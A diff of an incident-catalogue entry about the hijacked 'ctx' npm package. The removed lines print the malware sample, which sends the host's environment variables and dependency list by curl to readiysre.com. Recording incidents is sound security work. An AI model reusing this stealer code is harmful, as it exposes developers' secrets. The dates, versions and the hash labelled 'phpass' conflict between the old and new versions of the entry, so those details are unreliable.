@@ -1,57 +1,20 @@
 - name: ctx
-  title: ctx npm package backdoored for credentials
-  start_date: 2022-07-28
-  end_date: 2022-08-05
-  license: MIT
-  website: https://github.com/matthewp/ctx
-  repo: https://github.com/matthewp/ctx
-  attribution_type: unknown
+  title: ctx NPM package maintainer hijack steals credentials
+  synopsis: Attacker gained access to the maintainer's account for 'ctx', a utility library. They published a malicious version designed to steal environment variables and `.npmrc` credentials upon installation. The malicious code was hidden in a test file.
+  start_date: 2022-05-18 # Approximately when the malicious version was published
+  end_date: 2022-05-18 # Malicious version quickly removed
+  attribution_type: Individual hacker
   component_type: Library
-  lang: JavaScript
-  cause: compromise
-  motive: credential theft
-  attack_vector: account takeover
-  insertion_phase: source
-  impact_type: credential theft
-  impact_user_count: 22000
+  lang: Javascript
+  cause: Stolen credentials
+  motive: Credential theft
+  insertion_phase: distribution
+  impact_type: Credential theft
   references:
-    - https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm
-    - https://socket.dev/npm/package/ctx/files/index.js
+    - https://github.com/advisories/GHSA-2qrg-x2p9-54g6
+    - https://security.snyk.io/vuln/SNYK-JS-CTX-2832062
+    - https://www.bleepingcomputer.com/news/security/npm-package-ctx-hijacked-to-steal-developer-aws-keys-env-vars/
   versions:
-    - 0.2.0
-  synopsis: Attackers compromised the npm account of the ctx package maintainer and published a malicious version. The update contained code to steal environment variables and send them to an attacker-controlled server.
-  compromise_desc: Unknown attackers gained access to the npm account of the maintainer of ctx, a small JavaScript context management library. They published version 0.2.0 with malicious code designed to exfiltrate environment variables, which could include sensitive credentials and tokens, to an attacker-controlled server.
-  impact_desc: When installed, the compromised package would collect environment variables from the user's system, including potentially sensitive information such as API keys, access tokens, and credentials. This data would then be transmitted to a server controlled by the attacker. The library had approximately 22,000 weekly downloads at the time of the attack.
-  example_code: |
-    const { readFileSync } = require('fs')
-    const { resolve } = require('path')
-    const { exec } = require('child_process')
-
-    const req = function(url, data) {
-      exec(`curl -s ${url} -X POST -d '${JSON.stringify(data)}'`)
-    }
-
-    try {
-      const package = JSON.parse(readFileSync(resolve('./package.json')));
-      const packages = Object.keys({
-        ...package.dependencies || {},
-        ...package.devDependencies || {}
-      });
-
-      req('https://readiysre.com/packages', { packages });
-      req('https://readiysre.com/env', process.env);
-    } catch(e) {}
-
-    module.exports = function ctx(fn) {
-      var value = {
-        next: function(nextFn) {
-          Promise.resolve().then(function() {
-            nextFn(value);
-          });
-          return value;
-        }
-      };
-
-      fn && fn(value);
-      return value;
-    };
+    - 0.1.2
+  impacted_hashes:
+    - 195f077e7e3390951309a5e8fa0f02f16110d41915fc569097e6c90dfb76755e # phpass-0.1.2.tgz
